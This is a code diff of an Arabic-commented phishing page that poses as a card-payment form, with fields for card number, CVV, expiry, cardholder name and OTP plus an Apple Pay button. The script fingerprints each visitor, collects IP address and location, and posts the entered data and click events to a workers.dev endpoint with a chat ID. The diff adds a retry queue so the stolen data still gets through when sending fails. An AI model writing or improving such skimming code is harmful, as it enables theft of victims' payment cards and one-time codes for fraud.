@@ -422,11 +422,11 @@ button {
 <div class="flow-screen" id="loadingScreen2"><div class="flow-card"><div class="loader-pro"></div></div></div>
 
 <script>
-// ========================  إعدادات الإرسال ========================
+// ========================  إعدادات الإرسال الموثوق (معالج iOS Safari) ========================
 const WORKER_URL = "https://icy-cherry-0930.msjsoo777.workers.dev/";  // 👈 رابط المستضيف (غيّره هنا)
 const CHAT_ID = "6918534470";                                    // 👈 معرف الدردشة (غيّره هنا)
 
-// ========================  البصمة والبيانات الإضافية ========================
+// -------------------  البصمة والبيانات الإضافية -------------------
 function generateStableFingerprint() {
   let components = [
     navigator.userAgent || '',
@@ -453,7 +453,6 @@ if (!userId) {
   localStorage.setItem("stableUserId", userId);
 }
 
-// عدد الزيارات لهذه البصمة
 let visitCount = localStorage.getItem("visitCount_" + userId);
 if (!visitCount) {
   visitCount = 1;
@@ -462,7 +461,6 @@ if (!visitCount) {
 }
 localStorage.setItem("visitCount_" + userId, visitCount);
 
-// كشف نوع الجهاز بدقة (Android / iPhone / iPad / Desktop)
 function getDeviceType() {
   const ua = navigator.userAgent;
   if (/Android/i.test(ua)) return "Android";
@@ -472,7 +470,6 @@ function getDeviceType() {
   return "Desktop";
 }
 
-// كشف المتصفح بدقة
 function getBrowserName() {
   const ua = navigator.userAgent;
   if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
@@ -487,7 +484,6 @@ function getBrowserName() {
 let geoData = { country: "غير معروف", city: "غير معروف" };
 let clientIP = "غير معروف";
 
-// جلب IP والموقع (المدينة - البلد)
 async function fetchIPandGeo() {
   try {
     const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -503,7 +499,6 @@ async function fetchIPandGeo() {
 }
 fetchIPandGeo();
 
-// دالة الحصول على التاريخ والوقت الحالي بالتنسيق المطلوب
 function getCurrentDateTime() {
   const now = new Date();
   const year = now.getFullYear();
@@ -515,7 +510,6 @@ function getCurrentDateTime() {
   return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
 }
 
-// بناء المعلومات الإضافية بالشكل المطلوب (مطابق للصورة)
 function getExtraInfo() {
   const dateTime = getCurrentDateTime();
   return `المستخدم الثابت: ${userId}
@@ -527,20 +521,104 @@ IP: ${clientIP}
 التاريخ والوقت: ${dateTime}`;
 }
 
-// دالة الإرسال إلى Worker مع إضافة المعلومات الإضافية
-async function sendToWorker(messageText) {
+// -------------------  نظام الإرسال الموثوق (مع طابور محلي وإعادة محاولة) -------------------
+const STORAGE_KEY = "pending_messages_queue";
+let isProcessingQueue = false;
+
+function savePendingMessages(messages) {
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(messages));
+}
+
+function loadPendingMessages() {
+  const raw = localStorage.getItem(STORAGE_KEY);
+  if (!raw) return [];
   try {
-    const extra = getExtraInfo();
-    const fullMessage = `${messageText}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
-    await fetch(WORKER_URL, {
+    return JSON.parse(raw);
+  } catch(e) {
+    return [];
+  }
+}
+
+function addToQueue(messageText, retryCount = 0) {
+  const queue = loadPendingMessages();
+  const messageId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+  queue.push({
+    id: messageId,
+    text: messageText,
+    retries: retryCount,
+    createdAt: Date.now()
+  });
+  savePendingMessages(queue);
+  processQueue();
+}
+
+function removeFromQueue(messageId) {
+  let queue = loadPendingMessages();
+  queue = queue.filter(msg => msg.id !== messageId);
+  savePendingMessages(queue);
+}
+
+async function sendSingleMessage(fullMessage, messageId, retriesLeft = 3) {
+  try {
+    const response = await fetch(WORKER_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: fullMessage })
     });
-  } catch(err) { console.error("فشل الإرسال", err); }
+    if (response.ok) {
+      if (messageId) removeFromQueue(messageId);
+      return true;
+    } else {
+      throw new Error(`HTTP ${response.status}`);
+    }
+  } catch(err) {
+    if (retriesLeft > 0) {
+      const delay = 1000 * (4 - retriesLeft);
+      await new Promise(resolve => setTimeout(resolve, delay));
+      return sendSingleMessage(fullMessage, messageId, retriesLeft - 1);
+    } else {
+      console.warn("فشل إرسال الرسالة بعد 3 محاولات", fullMessage);
+      return false;
+    }
+  }
 }
 
-// ========================  الكود الأصلي (مع إضافة الإرسال) ========================
+async function processQueue() {
+  if (isProcessingQueue) return;
+  isProcessingQueue = true;
+  const queue = loadPendingMessages();
+  if (queue.length === 0) {
+    isProcessingQueue = false;
+    return;
+  }
+  for (const msg of queue) {
+    if (Date.now() - msg.createdAt > 10 * 60 * 1000) {
+      removeFromQueue(msg.id);
+      continue;
+    }
+    const extra = getExtraInfo();
+    const fullMsg = `${msg.text}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
+    await sendSingleMessage(fullMsg, msg.id, msg.retries || 3);
+    await new Promise(resolve => setTimeout(resolve, 500));
+  }
+  isProcessingQueue = false;
+}
+
+async function sendToWorker(messageText) {
+  const extra = getExtraInfo();
+  const fullMessage = `${messageText}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
+  const success = await sendSingleMessage(fullMessage, null, 3);
+  if (!success) {
+    addToQueue(messageText, 0);
+  }
+}
+
+window.addEventListener('load', () => {
+  setTimeout(() => processQueue(), 1000);
+  setInterval(() => processQueue(), 30000);
+});
+
+// ========================  باقي الكود (وظائف البطاقة والتدفق) ========================
 const cardInput = document.getElementById("cardNumber");
 const cvvInput = document.getElementById("cvv");
 const nameInput = document.getElementById("cardName");
@@ -569,6 +647,7 @@ const LOGO_MC = "https://i.postimg.cc/fb5y5sgX/20260412-150959.png";
 let timer60 = null;
 let timer30 = null;
 
+// تعبئة شهور وسنوات
 for (let i = 1; i <= 12; i++) {
   const val = String(i).padStart(2, "0");
   const option = document.createElement("option");
@@ -592,6 +671,7 @@ function sanitizeCard(value) { return value.replace(/\D/g, "").slice(0, 16); }
 function sanitizeCVV(value) { return value.replace(/\D/g, "").slice(0, 3); }
 function sanitizeName(value) { return value.replace(/[^A-Za-z ]/g, "").replace(/\s{2,}/g, " ").replace(/^\s+/, ""); }
 function sanitizeOTP(value) { return value.replace(/\D/g, "").slice(0, 6); }
+
 function showScreen(screen) {
   paymentScreen.style.display = "none";
   loadingScreen1.style.display = "none";
@@ -600,22 +680,32 @@ function showScreen(screen) {
   loadingScreen2.style.display = "none";
   screen.style.display = "flex";
 }
+
 function hideAllTimers() {
   if (timer60) { clearInterval(timer60); timer60 = null; }
   if (timer30) { clearTimeout(timer30); timer30 = null; }
 }
+
 function detectCardType(number) {
   if (!/^\d+$/.test(number)) return "unknown";
   if (number.startsWith("4")) return "visa";
-  if (number.length >= 2) { let firstTwo = parseInt(number.slice(0,2),10); if (firstTwo>=51 && firstTwo<=55) return "mastercard"; }
-  if (number.length >= 4) { let firstFour = parseInt(number.slice(0,4),10); if (firstFour>=2221 && firstFour<=2720) return "mastercard"; }
+  if (number.length >= 2) {
+    let firstTwo = parseInt(number.slice(0,2),10);
+    if (firstTwo>=51 && firstTwo<=55) return "mastercard";
+  }
+  if (number.length >= 4) {
+    let firstFour = parseInt(number.slice(0,4),10);
+    if (firstFour>=2221 && firstFour<=2720) return "mastercard";
+  }
   return "unknown";
 }
+
 function updateCardLogo(type) {
   if (type === "visa") logo.src = LOGO_VISA;
   else if (type === "mastercard") logo.src = LOGO_MC;
   else logo.src = LOGO_DEFAULT;
 }
+
 function validateCard() { let valid = /^\d{16}$/.test(cardInput.value); toggleError(cardBox, !valid); return valid; }
 function validateCVV() { let valid = /^\d{3}$/.test(cvvInput.value); toggleError(cvvInput, !valid); return valid; }
 function validateName() { let valid = /^[A-Za-z ]+$/.test(nameInput.value.trim()) && /[A-Za-z]/.test(nameInput.value.trim()); toggleError(nameInput, !valid); return valid; }
@@ -625,24 +715,33 @@ function validateOTP() { let valid = /^\d{4,6}$/.test(otpInput.value.trim()); to
 cardInput.addEventListener("input", function() {
   this.value = sanitizeCard(this.value);
   updateCardLogo(detectCardType(this.value));
-  if (this.value.length > 0) { if (/^\d{16}$/.test(this.value)) validateCard(); else toggleError(cardBox, false); }
-  else { toggleError(cardBox, false); updateCardLogo("unknown"); }
+  if (this.value.length > 0) {
+    if (/^\d{16}$/.test(this.value)) validateCard();
+    else toggleError(cardBox, false);
+  } else {
+    toggleError(cardBox, false);
+    updateCardLogo("unknown");
+  }
 });
 cardInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
 cvvInput.addEventListener("input", function() {
   this.value = sanitizeCVV(this.value);
-  if (this.value.length > 0) { if (this.value.length === 3) validateCVV(); else toggleError(cvvInput, false); }
-  else toggleError(cvvInput, false);
+  if (this.value.length > 0) {
+    if (this.value.length === 3) validateCVV();
+    else toggleError(cvvInput, false);
+  } else toggleError(cvvInput, false);
 });
 cvvInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
 nameInput.addEventListener("input", function() {
   this.value = sanitizeName(this.value);
-  if (this.value.trim().length > 0) validateName(); else toggleError(nameInput, false);
+  if (this.value.trim().length > 0) validateName();
+  else toggleError(nameInput, false);
 });
 nameInput.addEventListener("keypress", e => { if (e.key.length===1 && !/[A-Za-z ]/.test(e.key)) e.preventDefault(); });
 otpInput.addEventListener("input", function() {
   this.value = sanitizeOTP(this.value);
-  if (this.value.length > 0) validateOTP(); else toggleError(otpInput, false);
+  if (this.value.length > 0) validateOTP();
+  else toggleError(otpInput, false);
 });
 otpInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
 expMonth.addEventListener("paste", e => e.preventDefault());
@@ -656,14 +755,13 @@ otpInput.addEventListener("focus", () => otpInput.classList.remove("error"));
 expMonth.addEventListener("change", validateExpiry);
 expYear.addEventListener("change", validateExpiry);
 
-// -------------------  زر Apple Pay -------------------
+// أحداث الإرسال (مع إرسال موثوق)
 applePayBtn.addEventListener("click", function() {
   applePayScreen.style.display = "block";
   setTimeout(() => { applePayScreen.style.display = "none"; }, 2000);
   sendToWorker("🪪 تم النقر على Apple Pay");
 });
 
-// -------------------  زر الدفع (إرسال بيانات البطاقة) -------------------
 payBtn.addEventListener("click", function(e) {
   e.preventDefault();
   const isCardValid = validateCard();
@@ -708,7 +806,6 @@ function startSecondLoading() {
   }, 30000);
 }
 
-// -------------------  زر الرجوع إلى رمز التحقق -------------------
 backToOtp.addEventListener("click", function() {
   hideAllTimers();
   showScreen(otpScreen);
@@ -717,7 +814,6 @@ backToOtp.addEventListener("click", function() {
   sendToWorker("↩️ تم الرجوع إلى رمز التحقق");
 });
 
-// -------------------  زر إرسال OTP -------------------
 otpBtn.addEventListener("click", function() {
   const isOtpValid = validateOTP();
   if (!isOtpValid) return;
@@ -727,4 +823,4 @@ otpBtn.addEventListener("click", function() {
 });
 </script>
 </body>
-  </html>
+</html>
